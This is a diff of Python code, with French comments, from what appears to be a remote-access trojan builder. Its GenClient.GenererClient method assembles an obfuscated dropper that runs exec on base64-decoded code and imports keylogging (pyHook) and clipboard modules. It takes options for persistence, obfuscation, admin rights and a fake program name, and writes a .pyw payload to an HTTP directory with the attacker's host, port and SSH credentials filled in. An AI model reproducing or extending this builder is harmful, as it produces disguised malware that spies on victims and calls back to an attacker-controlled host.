@@ -117,9 +117,9 @@ class GenClient:
 
     def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe, adm, name_fake_gen):
         fin_dropeur = """)))))
-    except Exception as e:
-        print(str(e))
-        time.sleep(5*60)"""
+        except Exception as e:
+            print(str(e))
+            time.sleep(5*60)"""
         debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os,asyncio,pproxy,paramiko;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
         fin_loader = ")))"
         # definir url du payload
@@ -134,7 +134,7 @@ class GenClient:
         # ecrire le payload dans http
         fichier = open(self.pathDirHttp + name + ".pyw", "w")
         fichier.write(self.ReturnFichier("payload1.txt"))
-        fichier.write("\n    host = \"{}\"\n    port = {}\n    user_SSH = \"{}\"\n    password_SSH = \"{}\"\n".format(ip, str(port), username_SSH, password_SSH))
+        fichier.write("\n    host = \"{}\"\n    port = {}\n    user_SSH = \"{}\"\n    password_SSH = \"{}\"\n    name_proc = \"{}\"\n".format(ip, str(port), username_SSH, password_SSH, "load_" + name + ".exe"))
         fichier.write(self.ReturnFichier("payload2.txt"))
         fichier.close()
         # Ajouté les RandomString
